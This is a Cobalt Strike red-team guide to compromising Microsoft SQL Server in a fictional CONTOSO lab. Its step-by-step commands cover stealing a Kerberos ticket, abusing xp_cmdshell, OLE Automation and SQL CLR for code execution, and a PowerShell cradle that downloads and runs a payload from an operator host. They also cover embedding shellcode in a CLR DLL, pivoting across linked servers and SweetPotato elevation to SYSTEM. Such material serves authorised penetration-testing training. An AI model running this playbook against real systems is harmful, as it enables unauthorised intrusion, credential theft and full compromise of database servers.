---
title: "MSSQL Abuse with Cobalt Strike"
description: "A practical SQL-BOF reference for SQL Server discovery, permissions, code execution, linked servers and local privilege escalation. Examples use CONTOSO, lon-db-1, lon-db-2 and rsteel."
category: "Databases"
tools: ["MSSQL", "Cobalt Strike"]
updated: 2026-11-10
tags: ["mssql", "sql", "ad"]
draft: false
---

[SQL-BOF](https://github.com/Tw1sm/SQL-BOF)

## 1. Key concepts

| Concept | What it controls |
|---|---|
| SQL login | Identity authenticated to the instance through Windows or SQL authentication |
| Database user | Identity within a database, which may be mapped to a login |
| `public` | Baseline role; does not imply administrative privileges |
| `db_owner` | Control of a database; does not automatically grant `sysadmin` |
| `sysadmin` | Control of the SQL instance; does not imply Windows Administrators membership |
| SQL service account | Windows identity running `sqlservr.exe` and code executed in its context |
| `NT AUTHORITY\SYSTEM` | Windows identity obtained through local elevation in this example |

**Example flow:** initial access → SQL identity with `sysadmin` → execution as the SQL service → linked instance → remote execution → local elevation to SYSTEM.

## 2. Preparation and discovery

Load `C:\Tools\SQL-BOF\SQL\SQL.cna` through **Cobalt Strike → Script Manager**. The `sql-*` commands in this guide belong to SQL-BOF and must be loaded before use in Beacon.

`MSSQLSvc` SPNs identify services registered for Kerberos. This filter searches user accounts; it is not a complete inventory of SQL instances. TCP `1433` is common, but instances can use other ports.

```shell
# Find user accounts with SQL Server SPNs
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
# Example: mssql_svc and MSSQLSvc/lon-db-1.contoso.com:1433

# Supplement discovery by checking TCP/1433 on the target network
portscan 10.10.120.0/23 1433 arp 1024
# Expected: 10.10.120.20:1433 if reachable

# Query SQL Browser over UDP/1434, if available
sql-1434udp 10.10.120.20
# Expected: server, instance, version and advertised port
```

An absent SPN or an unanswered SQL Browser query does not prove SQL Server is absent.

## 3. Instance details, identity and data

`sql-info` summarizes the instance; `sql-whoami` checks the effective identity and roles. Visibility depends on permissions. Recheck the context after changing tokens or servers.

```shell
# Instance details and connection context
sql-info lon-db-1
# Review: CurrentLogin, IsSysAdmin, ServiceAccount, version and architecture

# Effective SQL roles
sql-whoami lon-db-1
# Check whether the login is a sysadmin

# Confirm which instance responds
sql-query lon-db-1 "SELECT @@SERVERNAME"
# Expected: lon-db-1 server name

# List accessible or visible databases
sql-databases lon-db-1
# Expected: results depend on the login permissions
```

Use these commands to explore data. Check their help for the arguments supported by the installed version.

| Command | Purpose |
|---|---|
| `sql-tables` | Tables in a database |
| `sql-columns` | Columns in a table |
| `sql-search` | Columns whose names contain a keyword |

### Access with a privileged identity

A limited login may not allow code execution. If another identity is available, verify its actual access to the instance. Here, `rsteel` belongs to `Database Admins`; the group name alone guarantees no SQL role.

```shell
# Query direct members of the example SQL administration group
ldapsearch (&(objectClass=group)(cn=Database Admins)) --attributes member,distinguishedName
# Expected: Robert Steel among the members; nested groups are not expanded

# From a SYSTEM Beacon: extract rsteel's available TGT
krb_dump /user:rsteel /service:krbtgt
# Expected: ticket material if present and accessible in this context

# After saving the ticket as rsteel.kirbi, prepare the network context
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

# Verify actual access in SQL
sql-info lon-db-1
sql-whoami lon-db-1
# Expected: CONTOSO\rsteel and sysadmin
```

`FakePass` is a placeholder used with the imported ticket, rather than a recovered password. Creating the context alone does not demonstrate successful authentication; verify the connection. SQL access also does not prove that `rsteel` is a Windows local administrator.

## 4. Execution through SQL Server

This flow uses **`sysadmin`** to enable features and execute code. Check the initial state first: `value_in_use = 0` means disabled; `1` means enabled. Record it before making changes.

| Technique | Mechanism | Example output |
|---|---|---|
| `xp_cmdshell` | Operating system command | Returns text rows |
| OLE Automation | COM objects such as `WScript.Shell` | `sql-olecmd` does not return stdout |
| SQL CLR | Procedure from a .NET assembly | Verify the resulting Beacon |

### xp_cmdshell

Executes commands and returns their output. In this `sysadmin` flow, execution uses the SQL service's Windows identity.

```shell
# Query and record the initial state
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
# Expected: 0 or 1

# Enable only if needed
sql-enablexp lon-db-1

# Check the host and execution identity
sql-xpcmd lon-db-1 "hostname && whoami"
# Expected: server name and SQL service account, which may differ from SYSTEM

# Restore to 0 only if originally disabled
sql-disablexp lon-db-1
```

Equivalent within a SQL session:

```sql
EXEC xp_cmdshell 'hostname && whoami';
```

The `xp_cmdshell` command string allows at most one pair of double quotes. Pay particular attention to paths containing spaces.

### OLE Automation

OLE creates and manipulates COM objects. `sp_OACreate` creates an object, `sp_OAMethod` invokes methods and `sp_OADestroy` destroys it. Other operations handle properties, errors and stopping the OLE environment.

```shell
# Query and record the initial state
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

# Enable if originally disabled
sql-enableole lon-db-1

# Execute through WScript.Shell
sql-olecmd lon-db-1 "cmd /c calc"
# Expected: BOF execution message without command output
# A service's graphical application may not appear on your desktop

# Restore only if originally disabled
sql-disableole lon-db-1
```

OLE can also initiate a download and execution through PowerShell. Prepare the command in **PowerShell on the operator's machine**:

```powershell
# URL hosted by the operator and reachable from SQL Server
$cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
# Expected: Base64 command encoded as UTF-16LE
```

Then, with OLE enabled, run in **Beacon**:

```shell
# Replace the placeholder with the previous output
sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc <BASE64>"
# Check web logs: GET /b confirms the download, not complete execution

# If the resource starts an SMB Beacon, connect to its pipe
link lon-db-1 <PIPE_SMB>
# Expected: established link to child beacon
```

If SQL cannot reach the web server directly, a **reverse port forward** through a reachable host may provide connectivity. The example URL assumes access or forwarding is already configured. Check connectivity and the firewall if no request arrives. Restore OLE when finished.

### SQL CLR

SQL CLR integrates .NET into SQL Server. The example procedure is a public static method marked with `[SqlProcedure]`. The BOF registers the SHA-512 hash as a trusted assembly, creates the assembly and procedure, executes it and removes its temporary objects.

```shell
# Query and record the initial state
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'"

# Enable if originally disabled
sql-enableclr lon-db-1

# Load the DLL from the operator's machine and invoke the procedure
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
# Expected: successful loading and execution; verify the procedure's effect

# Restore only if originally disabled
sql-disableclr lon-db-1
```

**Preparing a DLL with a procedure that runs an SMB Beacon:** generate a Windows Stageless Payload with listener `smb`, x64 architecture, `Raw` format and `Thread` exit function. Save it as `smb_x64.xthread.bin`, embed it in a **Class Library (.NET Framework)** and compile the `MyProcedure` procedure.

The procedure reads `MyProcedure.smb_x64.xthread.bin`, allocates memory, copies the contents and creates a thread within the SQL process. The resource name must match the namespace and embedded file. Execution uses the service account; it does not grant SYSTEM by itself.

```shell
# Connect to the SMB Beacon created by the procedure
link lon-db-1 <PIPE_SMB>
# Expected: established link to child beacon

# In the child Beacon, confirm the resulting identity
getuid
# Expected: lon-db-1 SQL service account
```

`link` requires SMB connectivity and valid authentication, such as a usable TGT to obtain a CIFS ticket or an appropriate CIFS ticket already imported. The pipe name comes from the SMB listener. A failed `link` alone does not establish that CLR execution failed.

## 5. Linked servers: lon-db-1 → lon-db-2

A linked server exposes another data source through the initial instance. **The remote context depends on the link mapping:** fixed credentials or the session context, subject to authentication configuration. It can have more or fewer privileges than the source login.

```shell
# Enumerate links from the initial instance
sql-links lon-db-1
# Example: LON-DB-2

# Confirm the query destination
sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
# Expected: lon-db-2 server name

# Check effective permissions at the destination
sql-whoami lon-db-1 "" lon-db-2
# Example: sysadmin on lon-db-2
```

Keep the empty argument `""`: it places the linked server in the correct argument position.

### RPC Out and remote CLR

**RPC Out** permits remote procedure calls through the link. Being able to query data does not imply permission to make these calls. Changing the link option requires permissions on **lon-db-1**; enabling remote CLR requires permissions on **lon-db-2**.

```shell
# Query and record the link's RPC Out state at the source
sql-checkrpc lon-db-1
# Expected: LON-DB-2 row with 0 or 1

# Enable only if originally disabled
sql-enablerpc lon-db-1 lon-db-2

# Query and record the CLR state at the destination
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'" "" lon-db-2

# Enable remote CLR if needed
sql-enableclr lon-db-1 "" lon-db-2

# Execute the procedure on lon-db-2 through lon-db-1
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
# Expected: execution on lon-db-2

# Connect to the second server's SMB Beacon
link lon-db-2 <PIPE_SMB>
# Expected: new Beacon; check getuid in that session
```

The link carries the SQL operation. The subsequent `link` connection needs separate SMB connectivity and authentication to `lon-db-2`.

Restore **remote CLR first, then RPC Out**, if both were initially disabled:

```shell
# Run from the context with SQL access to the source
sql-disableclr lon-db-1 "" lon-db-2

# Restore the link option on lon-db-1
sql-query lon-db-1 "EXEC master.dbo.sp_serveroption @server=N'lon-db-2', @optname=N'rpc out', @optvalue=N'false';"

# Check the final state
sql-checkrpc lon-db-1
# Expected: LON-DB-2 returns to 0 if that was its initial value
```

## 6. Local elevation: SQL service → SYSTEM

On `lon-db-2`, the example account is `NT Service\MSSQLSERVER`. This virtual service account is not a local administrator by default and can use the machine identity for network access.

Its token may include **`SeImpersonatePrivilege`**, allowing impersonation of a client after authentication. The privilege's presence does not guarantee a particular technique will work; a disabled privilege also differs from an absent one.

```shell
# Run in the SQL service Beacon on lon-db-2
getuid
# Expected: NT Service\MSSQLSERVER

# Query token privileges
shell whoami /priv
# Look for SeImpersonatePrivilege and its state
```

SweetPotato attempts to create another process with a SYSTEM token through a compatible impersonation context. First prepare a Windows Stageless Payload using the `tcp-local` listener, saved on the operator's machine as `C:\Payloads\tcp-local_x64.exe`. This example assumes a local listener on TCP `1337`.

```shell
# Select the example remote directory; it must exist and be writable
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps

# Upload the payload from the operator to the current remote directory
upload C:\Payloads\tcp-local_x64.exe

# SweetPotato.exe is local to the operator; the -p path is on lon-db-2
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
# Expected: token acquisition and process creation if the technique succeeds

# From the original lon-db-2 Beacon, connect to the new process
connect localhost 1337
# Expected: established link to child beacon

# Switch to the child Beacon and confirm elevation
getuid
# Expected: NT AUTHORITY\SYSTEM
```

**SweetPotato performs elevation; `connect` establishes the connection.** `localhost` refers to `lon-db-2`, where the Beacon issuing the command runs. The original Beacon retains its identity.

## 7. Troubleshooting

| Symptom | What to check |
|---|---|
| No SPNs found | LDAP filter scope; supplement with port discovery |
| SQL Browser does not respond | Service, UDP/1434 and firewall; try the known SQL endpoint |
| Login fails or context is unexpected | Active token/ticket, identity and SQL access permissions |
| `sql-info` shows partial data | Login permissions; check `sql-whoami` |
| A feature cannot be enabled | Effective permissions and the server being changed |
| Linked queries work but execution fails | RPC Out and separate source/destination permissions |
| `sql-clr` fails | Local path, exact procedure name, CLR, trust and BOF errors |
| OLE returns no output | This BOF does not return stdout; check effects and logs |
| No web download appears | URL, hosted resource, connectivity, forwarding and firewall |
| `link` fails | Listener pipe, active process, SMB access and CIFS ticket/TGT |
| `connect localhost 1337` fails | Parent Beacon on the correct host, running payload and listener port |
| Beacon still uses the service account | Check the child identity; creating a process does not change the parent |

## 8. Cleanup and final checks

Disable only the options enabled during this operation. Preserve the original state of features that were already enabled.

```shell
# Restore the features used on the initial instance
sql-disablexp lon-db-1
sql-disableole lon-db-1
sql-disableclr lon-db-1

# Restore CLR on the linked server before disabling RPC Out
sql-disableclr lon-db-1 "" lon-db-2

# Disable RPC Out on the link
sql-disablerpc lon-db-1 lon-db-2

# Check the final RPC Out state
sql-checkrpc lon-db-1
# Expected: LON-DB-2 = 0 if originally disabled
```

## 9. Quick checklist

Replace `<...>` placeholders before running commands. Execution methods are alternatives: choose the appropriate one and check its requirements. Paths on the operator's machine and paths on the SQL server are distinct.

```text
PREPARATION AND DISCOVERY
[ ] Load SQL.cna in Cobalt Strike → Script Manager
[ ] Find SPNs: ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
[ ] Record discovered hosts, service accounts and instances
[ ] Supplement with ports: portscan <NETWORK/CIDR> 1433 arp 1024
[ ] Query SQL Browser if available: sql-1434udp <IP>
[ ] Confirm the actual instance port; do not always assume 1433

SQL IDENTITY AND PERMISSIONS
[ ] sql-info <SQL1>                         → login, service account, version and architecture
[ ] sql-whoami <SQL1>                       → effective roles and sysadmin membership
[ ] sql-query <SQL1> "SELECT @@SERVERNAME"   → confirm the instance
[ ] sql-databases <SQL1>                    → visible databases
[ ] Enumerate tables, columns and relevant names within available permissions
[ ] If another domain identity is available, verify its actual SQL access
[ ] If using a TGT: make_token <DOMAIN>\<USER> FakePass
[ ] Import the ticket: kerberos_ticket_use C:\path\user.kirbi
[ ] Repeat sql-info and sql-whoami after switching identity
[ ] Distinguish SQL sysadmin from Windows local administrator

EXECUTION — CHOOSE A METHOD
[ ] Query and record the chosen feature's initial value in sys.configurations
[ ] xp_cmdshell:
    [ ] sql-enablexp <SQL1>                 → only if initially disabled
    [ ] sql-xpcmd <SQL1> "hostname && whoami"
    [ ] Confirm the host and Windows account in the output
[ ] OLE Automation:
    [ ] sql-enableole <SQL1>                → only if initially disabled
    [ ] sql-olecmd <SQL1> "<COMMAND>"
    [ ] Verify the effect; this BOF does not return stdout
    [ ] For web downloads, check URL, connectivity and requests to the server
[ ] SQL CLR:
    [ ] Prepare a compatible DLL and confirm the procedure name
    [ ] sql-enableclr <SQL1>                → only if initially disabled
    [ ] sql-clr <SQL1> C:\path\MyProcedure.dll MyProcedure
    [ ] Verify execution and removal of temporary objects

SMB BEACON CONNECTION
[ ] Confirm listener pipe, SMB connectivity and destination authentication
[ ] link <SQL1> <PIPE_SMB>
[ ] In the child Beacon: getuid             → confirm the service account
[ ] If link fails, check SMB and tickets before concluding execution failed

LINKED SERVERS
[ ] sql-links <SQL1>                        → identify available links
[ ] sql-query <SQL1> "SELECT @@SERVERNAME" "" <SQL2>
[ ] sql-whoami <SQL1> "" <SQL2>             → check destination privileges
[ ] sql-checkrpc <SQL1>                     → record the selected link's RPC Out state
[ ] sql-enablerpc <SQL1> <SQL2>             → if needed and permitted at the source
[ ] Query and record SQL2 CLR state using sql-query with arguments "" <SQL2>
[ ] sql-enableclr <SQL1> "" <SQL2>          → if needed and permitted at the destination
[ ] sql-clr <SQL1> C:\path\MyProcedure.dll MyProcedure "" <SQL2>
[ ] link <SQL2> <PIPE_SMB>                  → requires separate SMB access to SQL2
[ ] In the new Beacon: getuid

LOCAL ELEVATION FROM THE SQL SERVICE
[ ] getuid                                  → identify the current Windows account
[ ] shell whoami /priv                      → look for SeImpersonatePrivilege
[ ] Check that the context supports the technique; the privilege alone is insufficient
[ ] Prepare the tcp-local payload and confirm its listening port
[ ] Upload the executable to an existing writable directory on the server
[ ] execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "<REMOTE_EXE_PATH>"
[ ] Check token acquisition and process creation
[ ] From the Beacon on that server: connect localhost 1337
[ ] In the child Beacon: getuid             → verify NT AUTHORITY\SYSTEM

RESTORATION AND CLOSURE
[ ] Disable features only if they were disabled initially
[ ] sql-disablexp <SQL1>                    → restore xp_cmdshell
[ ] sql-disableole <SQL1>                   → restore OLE Automation
[ ] sql-disableclr <SQL1>                   → restore local CLR
[ ] sql-disableclr <SQL1> "" <SQL2>        → restore remote CLR before RPC Out
[ ] sql-disablerpc <SQL1> <SQL2>            → restore the link's RPC Out state
[ ] sql-checkrpc <SQL1>                     → verify the link returned to its initial state
```
